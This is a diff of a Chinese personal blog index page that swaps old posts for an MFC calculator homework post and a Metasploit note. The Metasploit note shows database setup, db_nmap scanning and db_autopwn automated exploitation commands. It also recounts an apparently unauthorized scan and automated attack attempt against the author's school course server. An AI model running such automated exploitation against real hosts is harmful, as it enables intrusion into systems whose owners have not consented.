@@ -116,7 +116,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/Blog/" style="font-size: 20px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 15px;">Pi</a>
+						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 12.5px;">Pi</a> <a href="/tags/Wi-Fi/" style="font-size: 15px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a>
 					</div>
 				</section>
 				
@@ -346,11 +346,11 @@
 
 
   
-    <article id="post-2015-10-17-backtotop" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-2015-12-08-mfc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/10/17/2015-10-17-backtotop/" class="article-date">
-  	<time datetime="2015-10-17T02:34:08.000Z" itemprop="datePublished">2015-10-17</time>
+      <a href="/2015/12/09/2015-12-08-mfc/" class="article-date">
+  	<time datetime="2015-12-09T08:34:43.000Z" itemprop="datePublished">2015-12-09</time>
 </a>
     </div>
   
@@ -363,7 +363,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/17/2015-10-17-backtotop/">js代码实现返回顶部功能</a>
+      <a class="article-title" href="/2015/12/09/2015-12-08-mfc/">MFC POJ4</a>
     </h1>
   
 
@@ -372,31 +372,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>写在文前<br>话说本来也没想搞这个按钮的，但是前两天心血来潮写了一个电影推荐的文章，突然感觉回到页首好麻烦，于是我就去简单搞了一个返回顶部的按钮。<br>实现这个功能其实并不复杂，</p>
-<h3 id="u4F7F_u7528_u951A_u8FDE_u63A5"><a href="#u4F7F_u7528_u951A_u8FDE_u63A5" class="headerlink" title="使用锚连接"></a>使用锚连接</h3><ol>
-<li><p>在body的标签添加定位id:  </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span> <span class="attribute">id</span>=<span class="value">"top"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在最底部需要返回顶部的位置添加触发代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#top"</span>&gt;</span>返回顶部<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>这种方法的优点是显而易见的，缺点就是效果非常的渣。一天前我的返回顶部的标签js失败的时候就是这种效果，强迫症怎能就此止步！</p>
-<h3 id="u57FA_u4E8EjQuery_u5B9E_u73B0"><a href="#u57FA_u4E8EjQuery_u5B9E_u73B0" class="headerlink" title="基于jQuery实现"></a>基于jQuery实现</h3><ol>
-<li>添加div  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"back-top"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">a</span> <span class="attribute">title</span>=<span class="value">"返回顶部"</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"/img/scrollup.png"</span>/&gt;</span><span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>那个png文件是你自己要放在img文件夹里的，就是一个箭头的图。我的箭头图就是自己用ps画的。</p>
-<ol>
-<li>添加样式  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="id">#back-top</span> <span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">position</span>:<span class="value"> fixed</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">bottom</span>:<span class="value"> <span class="number">30px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">margin-left</span>:<span class="value"> <span class="number">1040px</span></span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"><span class="id">#back-top</span> <span class="tag">a</span> <span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">width</span>:<span class="value"> <span class="number">54px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">height</span>:<span class="value"> <span class="number">54px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">display</span>:<span class="value"> block</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">background</span>:<span class="value"> <span class="hexcolor">#ddd</span> <span class="function">url</span>(../img/bgs/bg_up_arrow.png) no-repeat center center</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">background-color</span>:<span class="value"> <span class="hexcolor">#aaa</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-border-radius</span>:<span class="value"> <span class="number">7px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-moz-border-radius</span>:<span class="value"> <span class="number">7px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">border-radius</span>:<span class="value"> <span class="number">7px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-transition</span>:<span class="value"> <span class="number">1s</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-moz-transition</span>:<span class="value"> <span class="number">1s</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">transition</span>:<span class="value"> <span class="number">1s</span></span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"><span class="id">#back-top</span> <span class="tag">a</span><span class="pseudo">:hover</span> <span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">background-color</span>:<span class="value"> <span class="hexcolor">#777</span></span></span>;</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>这里是使用一个背景透明的向上箭头图片，通过backgroud-color指定正常时和鼠标放上时的背景颜色，border-radius指定圆角的半径。</p>
-<ol>
-<li>添加js代码<br>我的代码如下，是直接放在post的模版文件里的，有兴趣的同学可以试试新建一个.js文件，在post模版文件里引用：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT type=text/javascript&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">goTopEx</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = <span class="built_in">document</span>.getElementById(<span class="string">"back-top"</span>);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getScrollTop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">document</span>.documentElement.scrollTop + <span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">setScrollTop</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">document</span>.documentElement.scrollTop) &#123;</span><br><span class="line">                <span class="built_in">document</span>.documentElement.scrollTop = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">document</span>.body.scrollTop = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            getScrollTop() &gt; <span class="number">0</span> ? obj.style.display = <span class="string">""</span></span><br><span class="line">            : obj.style.display = <span class="string">"none"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> goTop = setInterval(scrollMove, <span class="number">10</span>);</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">scrollMove</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                setScrollTop(getScrollTop() / <span class="number">1.1</span>);</span><br><span class="line">                <span class="keyword">if</span> (getScrollTop() &lt; <span class="number">1</span>)</span><br><span class="line">                clearInterval(goTop);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">goTopEx();</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="title">SCRIPT</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>以上就是实现过程，效果可以参考我的文章页面，忽略我用ps画的箭头-_-#</p>
+        <h2 id="MFC_u7684_u4F5C_u4E1A"><a href="#MFC_u7684_u4F5C_u4E1A" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+<li>编写一个计算器程序。使用该计算机使用编辑控件直接输入数据，并有加减乘除、平方根和倒数运算功能。</li>
+<li>简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。</li>
+</ul>
+<h3 id="u4EE3_u7801_u90E8_u5206"><a href="#u4EE3_u7801_u90E8_u5206" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSetfocusInput() </span><br><span class="line">&#123;</span><br><span class="line">	m_fInput=<span class="number">0.0</span>;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnAdd() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnCalc() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	UpdateData(TRUE);</span><br><span class="line">	<span class="keyword">switch</span>(m_nOP)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		    m_fResult=m_fInput;</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			m_fResult+=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			m_fResult-=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			m_fResult*=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			m_fResult/=m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			m_fResult=<span class="number">1</span>/m_fInput;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			m_fResult=<span class="built_in">sqrt</span>(m_fInput);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m_fInput=m_fResult;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnClear() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	m_fResult=<span class="number">0.0</span>;</span><br><span class="line">	m_fInput=<span class="number">0.0</span>;</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">	UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnDiv() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">4</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnMul() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">3</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnReciprocal() </span><br><span class="line">&#123;</span><br><span class="line">	m_nOP=<span class="number">5</span>;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSqrt() </span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	m_nOP=<span class="number">6</span>;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CCalculatorDlg::OnSub() </span><br><span class="line">&#123;</span><br><span class="line">	OnCalc();</span><br><span class="line">	m_nOP=<span class="number">2</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>省略了一些声明和初始化代码。</p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>新知识主要有:<br>为编辑控件的消息EN_SETFOCUS添加一个映射函数OnSetfocusInput()。<br>对话框类的成员函数UpdateData()用于更新数据。</p>
 
       
     </div>
@@ -405,12 +387,12 @@
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Javascript/">Javascript</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/">MFC</a></li></ul>
 	</div>
 
       
 	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/前端开发/">前端开发</a>
+	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
 	</div>
 
 
@@ -431,11 +413,11 @@
 
 
   
-    <article id="post-2015-10-15-cppcode3" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-2015-12-01-msfpostgres" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/10/15/2015-10-15-cppcode3/" class="article-date">
-  	<time datetime="2015-10-15T13:21:08.000Z" itemprop="datePublished">2015-10-15</time>
+      <a href="/2015/12/01/2015-12-01-msfpostgres/" class="article-date">
+  	<time datetime="2015-12-01T03:40:25.000Z" itemprop="datePublished">2015-12-01</time>
 </a>
     </div>
   
@@ -448,7 +430,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/15/2015-10-15-cppcode3/">c++ primer 2.2</a>
+      <a class="article-title" href="/2015/12/01/2015-12-01-msfpostgres/">Metasploit连接数据库</a>
     </h1>
   
 
@@ -458,69 +440,20 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ul>
-<li>2.15  </li>
-<li><p>Which of the following definitions,if any,are invalid?Why?        </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(a) <span class="keyword">int</span> ival=<span class="number">1.01</span>;  <span class="comment">//valid</span></span><br><span class="line">(b) <span class="keyword">int</span> &amp;rval=<span class="number">1.01</span>;  <span class="comment">//invalid</span></span><br><span class="line">(c) <span class="keyword">int</span> &amp;rval2=ival; <span class="comment">//valid</span></span><br><span class="line">(d) <span class="keyword">int</span> &amp;rval3;  <span class="comment">//invalid</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.17</p>
-</li>
-<li>What does the following code print?      <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i, &amp;ri = i;</span><br><span class="line">i = <span class="number">5</span>; ri = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" "</span> &lt;&lt; ri &lt;&lt; <span class="built_in">std</span>::endl;</span><br></pre></td></tr></table></figure>
+<li>最近的事情真的有点多-_-#在搞飞思卡尔的比赛，在搞学院的本科生研究发展计划，在学习蛋疼的模电，在搞入侵测试233，貌似接下来两周还有一个c++考试和英语六级…… 好长时间不写博客，也好长时间没写代码了。昨天在Kali Linux上尝试了下连通postgres数据库并进行了自动化攻击测试。这篇算是一个小小的备忘录。<br><h2>Linux上PostgreSQL的启用</h2><br>终端命令:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>输出10 10(这玩意叫右值引用，所以说把值赋给了与引用绑定的对象)</p>
+<p></p><h2>数据库配置</h2><br>设置密码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql postgres</span><br></pre></td></tr></table></figure><p></p>
+<p>进入数据库:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su postgres</span><br></pre></td></tr></table></figure></p>
+<p>创建用户和设置密码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createuser user -P</span><br></pre></td></tr></table></figure></p>
+<p></p><h2>Metasploit配置</h2><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf &gt; db_connect  <span class="comment">//可以不输入后面的参数，它会给例子</span></span><br><span class="line">msf &gt; db_hosts    <span class="comment">//列出数据库中的hosts</span></span><br><span class="line">msf &gt; db_status   <span class="comment">//查看数据库状态</span></span><br><span class="line">msf &gt; db_hosts -d &lt;ip&gt; <span class="comment">//删除数据中的某个host</span></span><br></pre></td></tr></table></figure><p></p>
+<p></p><h2>自动化渗透流程</h2><br>Nmap扫描，结果保存在数据库中:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -v -A -n &lt;ip&gt;   <span class="comment">//参数根据你的需要</span></span><br></pre></td></tr></table></figure><p></p>
+<p>查看数据库中的hosts，建议留一个host渗透:-)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_hosts</span><br></pre></td></tr></table></figure></p>
+<p>载入自动化攻击模块，并使用:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load db_autopwn</span><br><span class="line">db_autopwn -t -p -r -e</span><br></pre></td></tr></table></figure></p>
+<p>msf会提示你它不建议你使用这个，原因不清楚。我想大概是有违Hack精神吧233，毕竟脚本是人家写的。  </p>
 <ul>
-<li>2.18</li>
-<li><p>Write code to change the value of a pointer. Write code to change the value to which the pointer points.  </p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">int</span> a<span class="number">=0</span>,<span class="keyword">b=1;</span><br><span class="line"></span><span class="label">int</span> *<span class="literal">p1</span>=&amp;a,*<span class="literal">p2</span><span class="label">=p1</span><span class="comment">;</span></span><br><span class="line"><span class="label">p1</span><span class="label">=b</span><span class="comment">;</span></span><br><span class="line">*<span class="literal">p2</span><span class="label">=b</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.20</p>
-</li>
-<li>What does the following program do?<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i = 42;</span><br><span class="line">int <span class="keyword">*</span>p1 = &amp;i; <span class="keyword">*</span>p1 = <span class="keyword">*</span>p1 <span class="keyword">*</span> <span class="keyword">*</span>p1;</span><br></pre></td></tr></table></figure>
-</li>
+<li>我前两天用Nessus顺便扫了下学校的C语言课程的服务器，跑着Windows Server 2003的系统，还有Apache，貌似漏洞一堆还开了VNC服务，我尝试用了自动化渗透工具搞了一下，并没有sessions。所以说自动化渗透的成功率是相当低的。不管怎么说，metasploit还是有很多东西需要学习的，怎么能懒到搞自动化渗透呢233</li>
 </ul>
-<p>结果是1764 你以为把乘号放在指针符号中间我就不认识啦～</p>
-<ul>
-<li>2.21</li>
-<li>Explain each of the following definitions. Indicate whether any are illegal and, if so, why.<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">(a) <span class="keyword">double</span>* dp = &amp;i;  <span class="comment">//illegal</span></span><br><span class="line">(b) <span class="keyword">int</span> *ip = i;  <span class="comment">//illegal</span></span><br><span class="line">(c) <span class="keyword">int</span> *p = &amp;i;  <span class="comment">//legal</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>这个题呢，除了两种例外情况，其他所有指针的类型都要和它指向的类型相匹配哦。</p>
-<ul>
-<li>2.24</li>
-<li>Why is the initialization of p legal but that of lp illegal?  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">void</span> *p = &amp;i;</span><br><span class="line"><span class="keyword">long</span> *lp = &amp;i;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>void* 是一个可以指向类型的指针，第二个反正我是不会这么写。</p>
-<ul>
-<li>2.27</li>
-<li><p>Which of the following initializations are legal? Explain why.  </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = -<span class="number">1</span>, &amp;r = <span class="number">0</span>;         <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p2 = &amp;i2;        <span class="comment">// legal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> i = -<span class="number">1</span>, &amp;r = <span class="number">0</span>;   <span class="comment">// legal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p3 = &amp;i2;  <span class="comment">// legal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p1 = &amp;i2;        <span class="comment">// legal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;<span class="keyword">const</span> r2;        <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> i2 = i, &amp;r = i;   <span class="comment">// legal</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.28</p>
-</li>
-<li><p>Explain the following definitions. Identify any that are illegal.</p>
-<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i, *<span class="keyword">const</span> cp;       <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">int</span> *p1, *<span class="keyword">const</span> p2;     <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ic, &amp;r = ic;  <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p3;    <span class="comment">// illegal</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p;           <span class="comment">// legal</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.30</p>
-</li>
